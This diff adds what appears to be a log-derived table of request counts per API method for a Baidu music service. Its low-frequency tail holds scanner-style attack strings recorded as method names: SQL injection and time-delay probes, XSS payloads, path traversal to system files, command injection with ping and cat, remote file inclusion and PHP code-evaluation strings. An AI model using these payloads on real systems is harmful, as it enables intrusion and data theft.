@@ -1,0 +1,294 @@
+baidu.ting.song.getInfos	62293587
+baidu.ting.search.lrcpic	30180772
+baidu.ting.song.baseInfo	26917767
+baidu.ting.search.catalogSug	20801793
+baidu.ting.user.listenAge	19134126
+baidu.ting.song.play	17981655
+baidu.ting.search.common	17464692
+baidu.ting.song.down	9235033
+baidu.ting.song.lry	7876769
+baidu.ting.user.getUserBaseInfo	7768663
+baidu.ting.artist.getSongList	5449926
+baidu.ting.favorite.isCollect	5338629
+baidu.ting.search.lrcys	5158696
+ting.baidu.diy.getPlaylists	5113798
+baidu.ting.artist.getList	5095088
+baidu.ting.song.getInfo	4726324
+baidu.ting.billboard.billList	4677562
+baidu.ting.search.getPhotoInfos	4363777
+baidu.ting.user.config	3731318
+baidu.ting.game.gamedetail	3605136
+baidu.ting.plaza.getRecommendAlbum	3295649
+baidu.ting.user.checkSuggestVersion	3156477
+baidu.ting.user.checkComVersion	2956346
+baidu.ting.plaza.active	2840356
+baidu.ting.active.start	2838449
+baidu.ting.artist.getInfo	2619085
+baidu.ting.radio.playAction	2615597
+baidu.ting.diy.gedanInfo	2563777
+	2280813
+baidu.ting.user.registToUC	2162551
+baidu.ting.plaza.getFocusPic	1979998
+baidu.ting.diy.gedanHot	1812851
+baidu.ting.user.getMessage	1768649
+baidu.ting.search.suggestion	1448541
+baidu.ting.diy.category	1418393
+baidu.ting.artist.getinfo	1395006
+ting.baidu.plaza.recdaily	1394959
+baidu.ting.diy.addListenCount	1322434
+baidu.ting.radio.getChannelSong	1268841
+baidu.ting.diy.getSongFromOfficalList	1226802
+baidu.ting.album.getAlbumInfo	1181357
+baidu.ting.favorite.getCollectSong	1114996
+baidu.ting.plaza.recdaily	1072658
+baidu.ting.plaza.getPartDesc	967382
+baidu.ting.artist.getAlbumList	874474
+baidu.ting.feedback.song	821612
+baidu.ting.user.down	780310
+baidu.ting.user.RegistToImsg	743467
+baidu.ting.tag.songlist	672992
+baidu.ting.song.audio	671966
+baidu.ting.diy.gedan	652018
+baidu.ting.tag.getHotTag	641476
+baidu.ting.diy.getNowOfficalList	580633
+baidu.ting.radio.getCategoryList	454860
+baidu.ting.search.lrcyss	392802
+baidu.ting.billboard.billCategory	388055
+baidu.ting.diy.getPlaylists	334743
+baidu.ting.search.getPhotoInfo	313982
+baidu.ting.game.gamelist	232534
+baidu.ting.artist.get72HotArtist	230694
+baidu.ting.plaza.recommend	207014
+baidu.ting.favorite.getFavoriteSong	180644
+baidu.ting.song.buffer	176228
+baidu.ting.song.getMulInfos	146919
+baidu.ting.video.getList	133775
+baidu.ting.favorite.addSongFavorites	132097
+baidu.ting.mv.getIndexMV	117662
+baidu.ting.diy.getSimilarGedan	107237
+baidu.ting.tag.getAllTag	104500
+baidu.ting.favorite.addSongFavorite	104419
+baidu.ting.diy.search	101321
+baidu.ting.diy.getOfficialDiyList	80583
+baidu.ting.video.play	71705
+baidu.ting.user.checkVersion	55168
+baidu.ting.favorite.delCollectSong	47111
+baidu.ting.plaza.getNewSongs	42722
+baidu.ting.artist.getSpecialSongList	39429
+ting.baidu.diy.getPlaylist	38041
+baidu.ting.mv.playMV	34285
+baidu.ting.radio.getArtistChannelSong	27929
+baidu.ting.radio.getFavoriteSong	25790
+baidu.ting.plaza.getArtistPlaza	18071
+baidu.ting.diy.getPlaylist	17504
+baidu.ting.radio.serv	16989
+baidu.ting.artist.getHighSongTitle	13873
+baidu.ting.feedback.crash	13623
+baidu.ting.diy.saveList	13515
+baidu.ting.album.getList	11355
+baidu.ting.video.category	10682
+ting.baidu.film.getFilmInfo	9208
+baidu.ting.mv.searchMV	8324
+baidu.ting.favorite.delSongFavorite	7926
+baidu.ting.song.cloud	7890
+baidu.ting.outerPassport.profile	7304
+baidu.ting.song.getMulInfo	7177
+baidu.ting.artist.getQianQianArtist	6677
+ting.baidu.song.lry	6617
+baidu.ting.diy.addListSong	6481
+baidu.ting.weixin.response	6412
+baidu.ting.user.nplogin	5871
+baidu.ting.diy.delListSong	5264
+baidu.ting.diy.delList	5031
+baidu.ting.song.playAAC	4704
+baidu.ting.user.logout	4283
+baidu.ting.colorRing.listen	4139
+baidu.ting.billboard.catalog	4096
+baidu.ting.user.regPassport	3777
+baidu.ting.artist.getHighSongList	3457
+baidu.ting.colorRing.getCode	3164
+baidu.ting.colorRing.authset	2681
+baidu.ting.user.getMobileVcode	2555
+ting.baidu.artistapp.renum	2177
+baidu.ting.favorite.delSongFavorites	1943
+baidu.ting.diy.getRecommendSpeical	1728
+baidu.ting.feedback.info	1613
+baidu.ting.favorite.getFavoriteAlbum	1522
+baidu.ting.mv.getMultiSongMVInfo	1452
+baidu.ting.artist.getSongRank	1340
+baidu.ting.artist.getSong	1328
+baidu.ting.diy.addList	864
+baidu.ting.favorite.getListenHistory	767
+baidu.ting.mv.getMVCategory	757
+ting.baidu.artistapp.brief	720
+baidu.ting.video.recMv	578
+ting.baidu.search.lrcpic	546
+baidu.ting.diy.upList	533
+baidu.ting.colorRing.subscribe	528
+baidu.ting.favorite.getOffenListenList	490
+baidu.ting.colorRing.toneset	410
+baidu.ting.user.activate	322
+baidu.ting.artist.getInfoByName	293
+ting.baidu.plaza.getFocusPic	289
+baidu.ting.artist.getInfoList	262
+baidu.ting.song.getSuoSongInfo	238
+baidu.ting.artistapp.photo	163
+baidu.ting.favorite.addAlbumFavorite	158
+baidu.ting.favorite.getInfoFromView	155
+baidu.ting.user.login	150
+baidu.ting.song.getHash	130
+ting.baidu.artistapp.newList	108
+baidu.ting.vip.checkVIPPromotion	97
+ting.baidu.artistapp.news	79
+baidu.ting.favorite.delAlbumFavorite	68
+baidu.ting.user.addPassportInfo	65
+baidu.ting.plaza.getMisNewSong	60
+ting.baidu.artistapp.briefs	57
+baidu.ting.game.catalog	20
+baidu.ting.cloud.checkFile	19
+baidu.ting.album.getAlbumstyle	18
+baidu.ting.cloud.signature	13
+baidu.ting.cloud.record	12
+baidu.ting.vip.checkUserExchange	12
+baidu.ting.vip.exchangeVIP	9
+baidu.ting.user.checkNameUsed	6
+ /v8  ADw-script AD4-sslx=812812 ADw-/script AD4- nonxss	6
+ting.baidu.artistapp.send	5
+baidu.ting.user.checkPassWeak	5
+baidu.ting.favorite.getFavoriteSongCount	4
+baidu.ting.song.getPic	4
+(	3
+\' (	3
+baidu.ting.plaza.getFocusPicac97f<a>4cf7128f7db	3
+baidu.ting.song.playabcdc>>>>>\'\'\'\'\'\"\"\"\"\";;;	3
+ting.baidu.play.down	2
+baidu.ting.song.play\';alert(1);\'	2
+	2
+http://10.42.7.217/?1386758036.2	2
+baidu.ting.artist.get	2
+baidu.tifg.radio.playAction	2
+baidu.ting.plaza.getFocusPic\'	2
+baidu.ting.artist.getall	2
+baidu.ting.song.play>\'>\"><script>alert(1)</script>	1
+baidu.ting.plaza.getFocusPic|ping -n 20 127.0.0.1||x	1
+baidu.ting.plaza.getFocusPic|ping -c 20 127.0.0.1||x	1
+../../../../../../../../../../etc/rc.d/rc.local_.php	1
+baidu.ting.plaza.getFocusPic$(ping -c 20 127.0.0.1)	1
+http://cirt.lnet/rfiinc.txt	1
+file:///etc/passwd_.jpg	1
+baidu.ting.plaza.getFocusPic`ping -c 20 127.0.0.1`	1
+baidu.ting.plaza.getFocusPic\' and \'1637\'=\'1638	1
+baidu.ting.plaza.getFocusPic\' and \'1637\'=\'1637	1
+baidu.ting.song.play</script><script>alert(1);//	1
+baidu.ting.plaza.getFocusPic_ac97f<a>4cf7128f7db	1
+../../../../../../../../../../etc/rc.d/rc.local_	1
+baidu.ting.radio.playActaon	1
+c:/windows/win.ini_.php	1
+baidu.ting.song.play<script>confirm(1)</script>	1
+baidu.ting.plaza.getFocusPic\' and 1637=1638-- 	1
+baidu.ting.plaza.getFocusPic\' and 1637=1637-- 	1
+baidu.ting.song.play\') and 8288=8288 and (\'	1
+../../../../../../../../../../etc/passwd_.php	1
+baidu.ting.song.play\'/**/<scr/**/ipt>/**/>	1
+ting.baidu.plaza.recommend	1
+baidu.ting.song.play\' and \'8281\'=\'8281	1
+../../../../../../../../../../etc/passwd	1
+baidu.ting.song.playjavascript:alert(1)	1
+data://text/plain;base64,dGVzdA==_.jpg	1
+file:///etc/rc.d/rc.local_	1
+ting.baidu.song.play	1
+file:///etc/passwd	1
+(select 1)	1
+baidu.ting.song.play\'\";alert(1);//	1
+baidu.ting.plaza.getFocusPicalert(1)	1
+ting.baidu.song.down	1
+c:/windows/win.ini	1
+data://text/plain;base64,dGVzdA==_	1
+baidu.ting.song.play\";alert(1);\"	1
+data://text/plain;base64,dGVzdA==	1
+1\\\";cat /etc/rc.d/rc.local;\\\"	1
+http://cirt.lnet/rfiinc.txt_.jpg	1
+14a83d43821eee88)!(sn=*	1
+baidu.ting.plmit=5	1
+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini_baidu.ting.plaza.getFocusPic	1
+file:///etc/rc.d/rc.local	1
+baidu.ting.song.play;alert(1);//	1
+baidu.tingr.lir.listenAge	1
+baidu.ting.plaza.getFocusPic]]>>	1
+ting.baidu.song.buffer	1
+baidu.ting.diy.getPreOfficalList	1
+file:///etc/rc.d/rc.local_.jpeg	1
+baidu.ting.push.send	1
+.user.getUserBas4UUljS0gwaXJSbHZpVlh6TFFsWDdNWGZJNFUwWHVhUndDWWNvLWRMb1ZQcDFTQVFBQUFBJCQAAAAAAAAAAAEAAAAKXhEUMTMyOTE5NTU4ODEAAAAAAAAAAAAAAAAAAAAAAAAAAAASO	1
+baidu.ting.plaza.getFocusPic_\'	1
+string:{var_dump(md5(812812))}	1
+baidu.tingw% \'%*/ur.listenAge	1
+set	1
+baidu.ting.user.updatePassword	1
+1;cat /etc/rc.d/rc.local;	1
+ting.baidu.song.getinfos	1
+baidu.ting.song.play(\')\'))(\")\'\"\"\"\")	1
+baidu.ting.plaza.getFocusPic\"	1
+baidu.ting.plaza.getFocusPic1=	1
+/usr/bin/id;	1
+../../../../../../../../../../etc/rc.d/rc.local	1
+baidu.ting.plaza.getFocusPic..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini	1
+%{	1
+${	1
+14a83d43821eee88)(sn=*	1
+baidu.ting.plaza.getFocusPic../../../../../../../../../../../../../../../../windows/win.ini	1
+baidu.ting.plaza.getFocusPic../../../../../../../../../../../../../../../../winnt/win.ini	1
+\'];${@print(md5(812812))};//	1
+baidu.ting.plaza.getFocusPic../../../../../../../../../../../../../../../../etc/passwd	1
+baidu.ting.song.play\'>\"></title></textarea></script><img src=a onerror=alert(1)>	1
+1\';cat /etc/rc.d/rc.local;\'	1
+baidu.ting.game.gameplay	1
+baidu.ting.song.play%\' and 8281=8281 and \'%\'=\'	1
+${@print(md5(812812))}	1
+baidu.ting.song.play\"><img src=1 onerror=alert(1)>	1
+(select 1,2)	1
+baidu.ting.plaza.getFocusPic84b5d6acc46ff64f9dec9d77	1
+baidu.t	1
+*)(sn=*	1
+baidu.ting.plaza.getFocusPic\' and 1 in (select benchmark(20000000,sha1(1)))-- 	1
+baidu.ting.song.play<scrip<script>t>window.a==1?1:alert(1)</scrip</script>t>	1
+../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././rc.local_.php	1
+../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././rc.local_	1
+http://cirt.lnet/rfiinc.txt_	1
+baidu.ting.plaza.getFocusPic|echo 167bb62128851557 bf5432ca0125ddd2||a	1
+../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././rc.local	1
+baidu.ting.plaza.getFocusPic\'))and benchmark(20000000,sha1(1))-- 	1
+baidu.ting.plaza.getFocusPic\' and benchmark(20000000,sha1(1))-- 	1
+baidu.ting.song.play</textarea></title><script>alert(1)</script>	1
+../../../../../../../../../../../../../../../../windows/win.ini	1
+file:///etc/passwd_	1
+baidu.ting.plaza.getFocusPic\',0,0,0)waitfor delay\'0:0:20\'--	1
+baidu.ting.plaza.getFocusPic\' benchmark(20000000,sha1(1))-- 	1
+baidu.ting.plaza.getFocusPic\' benchmark(20000000,sha1(1)) \'	1
+../../../../../../../../../../../../../../../../winnt/win.ini	1
+baidu.ting.plaza.getFocusPic\',0,0)waitfor delay\'0:0:20\'--	1
+http://portswigger.net/f517a2bc19bdff66d7c64e8a7ad2f043.txt	1
+baidu.ting.plaza.getFocusPic\',0)waitfor delay\'0:0:20\'--	1
+../../../../../../../../../../../../../../../../etc/passwd	1
+baidu.ting.song.play--></script><script>alert(1)</script>	1
+baidu.ting.plaza.getFocusPic\')and benchmark(20000000,sha1(1))-- 	1
+baidu.ting.plaza.getFocusPic10281646\' or \'5007\'=\'5008	1
+baidu.ting.plaza.getFocusPic10281646\' or \'5007\'=\'5007	1
+baidu.ting.plaza.getFocusPic\')waitfor delay\'0:0:20\'--	1
+baidu.ting.song.play\'>\\\';</script>>\\\"><script>alert(1)</script>\'	1
+ting.baidu.song.getMulinfos	1
+baidu.ting.plaza.getFocusPic\' waitfor delay\'0:0:20\'--	1
+baidu.ting.plaza.getFocusPic10281646\' or 5007=5008-- 	1
+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini	1
+baidu.ting.plaza.getFocusPic10281646\' or 5007=5007-- 	1
+ting.baidu.get.getPlaylists	1
+84b5d6ac514c5e3d5a7e459b	1
+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini	1
+ting.baidu.song.playAAC	1
+baidu.ting.song.play\"\'><body id=ssltest title=alert(1) onload=eval(ssltest.title)>	1
+c:/windows/win.ini_	1
+../../../../../../../../../../../../../../../../etc/passwd_baidu.ting.plaza.getFocusPic	1
+bai-8859-1,	1
+*)!(sn=*	1
+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini_baidu.ting.plaza.getFocusPic	1
+baidu.ting.plaza.getFocusPic..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini	1
